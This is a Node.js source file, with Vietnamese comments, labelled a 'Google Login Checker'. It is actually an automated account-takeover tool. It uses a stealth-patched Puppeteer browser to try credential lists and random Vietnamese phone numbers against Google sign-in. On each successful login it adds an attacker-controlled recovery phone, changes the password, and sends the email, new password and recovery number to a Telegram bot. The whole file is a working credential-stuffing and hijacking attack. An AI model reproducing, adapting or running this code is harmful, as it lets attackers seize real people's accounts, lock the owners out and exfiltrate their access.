// 📦 Phiên bản đầy đủ nhất của hệ thống Google Login Checker
const express = require('express');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
require('dotenv').config();
const { randomLoginData, typePassword, delay, getRapt, exists, sendTelegramMessage, changeGooglePassword, waitForRecoveryAdd } = require('phonevn');

const app = express();
const PORT = process.env.PORT || 3000;
let accountList = loadAccountsFromTxt();
let accountIndex = 0;
let phoneCount = 0;
let page = null;
let mID = null;
let mLoaded = false;
let mPassword = null;
let mRecovery = null;
let screenshotCount = 0;
const stepDir = path.join('/tmp', 'steps');

// 📁 Middleware
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use('/steps', express.static(stepDir));

// 🔄 Tải tài khoản từ file
function loadAccountsFromTxt(txtFile = 'accounts.txt') {
  const filePath = path.join(__dirname, txtFile);
  if (!fs.existsSync(filePath)) return [];
  return fs.readFileSync(filePath, 'utf-8')
    .split('\n')
    .map(line => line.trim())
    .filter(line => line && !line.startsWith('#'))
    .map(line => {
      const [emailOrPhone, password] = line.split(',');
      return { emailOrPhone, password };
    });
}

function logStep(message) {
  const now = new Date().toLocaleTimeString();
  console.log(`[${now}] [STEP] ${message}`);
}

function ensureStepDir() {
  if (!fs.existsSync(stepDir)) fs.mkdirSync(stepDir);
}

function clearStepFolder() {
  if (fs.existsSync(stepDir)) {
    fs.readdirSync(stepDir).forEach(file => {
      fs.unlinkSync(path.join(stepDir, file));
    });
    logStep('🧹 Đã dọn thư mục steps');
  }
  screenshotCount = 0;
}

async function captureStep(page, stepName = 'step') {
  ensureStepDir();
  const fileName = `${String(screenshotCount).padStart(2, '0')}_${stepName}.png`;
  const filePath = path.join(stepDir, fileName);
  await page.screenshot({ path: filePath });
  logStep(`📸 Đã chụp ảnh: ${fileName}`);
  screenshotCount++;
}

// 🌐 Route hiển thị HTML ảnh
app.get('/steps/view', (req, res) => {
  const files = fs.existsSync(stepDir)
    ? fs.readdirSync(stepDir).filter(f => f.endsWith('.png'))
    : [];
  const html = `
  <html><head><title>Steps</title><style>
    body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
    img { width: 600px; margin: 10px 0; border: 1px solid #ccc; box-shadow: 0 0 5px #aaa; }
    .item { margin-bottom: 30px; }
  </style></head><body>
  <h2>📸 Các bước đăng nhập</h2>
  ${files.map(f => `<div class='item'><img src='/steps/${f}' /><div>${f}</div></div>`).join('')}
  </body></html>`;
  res.send(html);
});

puppeteer.use(StealthPlugin());
app.listen(PORT, () => console.log(`🚀 Express đang chạy tại http://localhost:${PORT}`));

// 🧠 Gọi vòng lặp login
(async function loop() {
  const name = process.env.username || 'anonymous';
  await sendTelegramMessage(`📲 ${name} is running`);
  while (true) {
    try {
      await startBrowser();
    } catch (err) {
      console.error('[LOOP] Lỗi:', err.message);
    }
    await delay(10000);
  }
})();

// ✅ Hàm chính
async function startBrowser() {
  clearStepFolder();
    try {
        let browser = await puppeteer.launch({
            headless: false,
            //headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-notifications',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-skip-list',
                '--disable-dev-shm-usage'
            ],
            executablePath: process.env.NODE_ENV == 'production' ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath()
        })
      page = (await browser.pages())[0]
      let foundPasswordPage = false;
      let phone, password, emailOrPhone;
          while (!foundPasswordPage) {
      if (accountList.length > 0 && accountIndex < accountList.length) {
        ({ emailOrPhone, password } = accountList[accountIndex++]);
        logStep(`📤 Dùng tài khoản từ file: ${emailOrPhone}`);
      } else {
        ({ phone, password } = randomLoginData());
        phoneCount++;
        emailOrPhone = '84' + phone.replace(/^0/, '');
        logStep(`📤 Tạo tài khoản random: ${emailOrPhone}`);
      }
      // Vào đúng URL, KHÔNG nhập email vào form nữa, chỉ click next
      await page.goto("https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fsecurity&ec=GAZAwAE&followup=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fsecurity&ifkv=AdBytiMQP4oqdCGRqBJL2k3ZHiB6Y3feULcc0TtKSLvINSNY5DjVA0B3BX0MTo3yIG-8hxSr3Fen&osid=1&passive=1209600&service=accountsettings&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S2099267155%3A1753582003030136", { waitUntil: 'load', timeout: 0 });
      await delay(1000);
      await page.type('#identifierId', emailOrPhone);
      logStep('Đã nhập tài khoản');
      await delay(2000);
      await captureStep(page, 'goto_login');
      await delay(1000);

      // KHÔNG nhập email nữa
      
      await page.click('#identifierNext');
      await delay(4000);
      await captureStep(page, 'after_next');

      const url = await page.url();
      if (url.includes('/challenge/pwd')) {
        foundPasswordPage = true;
      }
    }

    await typePassword(page, password);
    await captureStep(page, 'typed_password');
    await delay(3000);

    const { status, message } = await detectLoginStatus(page);
    logStep(`⛳ Trạng thái: ${status} - ${message}`);
    await captureStep(page, `status_${status}`);
    if (status !== 1 && status !== 8) return;

    mRecovery = randomLoginData().recover;
    mPassword = randomLoginData().password2;

    await page.goto('https://myaccount.google.com/signinoptions/rescuephone', { waitUntil: 'load', timeout: 0 });
    await delay(4000);
    await captureStep(page, 'rescue_page');

    const email = await page.evaluate(() => {
      const el = document.querySelector('div[jsname="bQIQze"].IxcUte');
      return el ? el.innerText.trim() : null;
    });

    if (!email) return;
    const mRapt = await getRapt(await page.url());
    await waitForRecoveryAdd(page, mRapt, mRecovery);
    await captureStep(page, 'added_recovery');
    await changeGooglePassword(page, mRapt, mPassword);
    await captureStep(page, 'changed_password');

    await sendTelegramMessage(`✅ ${email} | ${mPassword} | ${mRecovery} | ${phone || emailOrPhone}`);
  } catch (err) {
    logStep('[ERROR] ' + err.message);
  } finally {
    if (browser) await browser.close();
  }
}

async function detectLoginStatus(page) {
  // status 1: login thành công
  // status 2: tài khoản không tồn tại
  // status 3: sai mật khẩu
  // status 4: bị checkpoint, xác minh
  // status 5: bị khóa, suspended
  // status 6: yêu cầu xác minh 2 bước
  // status 7: bị CAPTCHA
  // status 8: cần xác nhận lại thông tin khác
  // status 0: không xác định

  try {
    // Đợi 2s cho các thông báo hiện ra
    await delay(2000);

    // Kiểm tra login thành công (URL chuyển về tài khoản)
    const url = await page.url();
    if (
      url.includes('myaccount.google.com') ||
      url.includes('https://accounts.google.com/b/0/SwitchUser?') ||
      url.includes('https://myaccount.google.com/')
    ) {
      return { status: 1, message: 'Đăng nhập thành công' };
    }

    // Kiểm tra lỗi email không tồn tại
    if (await page.$('div[jsname="B34EJ"]')) {
      const text = await page.$eval('div[jsname="B34EJ"]', el => el.innerText);
      if (text && text.toLowerCase().includes('không tìm thấy tài khoản của bạn')) {
        return { status: 2, message: 'Email không tồn tại' };
      }
    }

    // Kiểm tra lỗi sai mật khẩu
    if (await page.$('div[jsname="B34EJ"]')) {
      const text = await page.$eval('div[jsname="B34EJ"]', el => el.innerText);
      if (text && (text.toLowerCase().includes('mật khẩu không chính xác') || text.toLowerCase().includes('wrong password'))) {
        return { status: 3, message: 'Sai mật khẩu' };
      }
    }

    // Kiểm tra checkpoint, xác minh (yêu cầu nhập mã xác minh, xác minh SĐT, v.v.)
    if (
      url.includes('/signin/v2/challenge/') ||
      url.includes('/signin/v2/sl/pwd') ||
      url.includes('/signin/v2/challenge/pwd') ||
      url.includes('/signin/v2/challenge/selection')
    ) {
      return { status: 4, message: 'Checkpoint, cần xác minh' };
    }

    // Kiểm tra tài khoản bị khóa/suspended
    if (
      (await page.content()).includes('Tài khoản của bạn đã bị tạm ngưng') ||
      (await page.content()).toLowerCase().includes('account has been suspended')
    ) {
      return { status: 5, message: 'Tài khoản bị khóa hoặc suspended' };
    }

    // Kiểm tra xác minh 2 bước
    if (
      url.includes('signin/challenge/2sv') ||
      url.includes('signin/challenge/ipp')
    ) {
      return { status: 6, message: 'Yêu cầu xác minh 2 bước' };
    }

    // CAPTCHA
    if (await page.$('iframe[src*="recaptcha"]')) {
      return { status: 7, message: 'Bị captcha' };
    }

    // Trường hợp cần xác nhận lại thông tin khác
    if (
      (await page.content()).toLowerCase().includes('xác nhận thông tin của bạn') ||
      (await page.content()).toLowerCase().includes('confirm your information')
    ) {
      return { status: 8, message: 'Cần xác nhận lại thông tin' };
    }

    return { status: 0, message: 'Không xác định' };
  } catch (err) {
    return { status: 0, message: 'Lỗi khi xác định trạng thái' };
  }
}
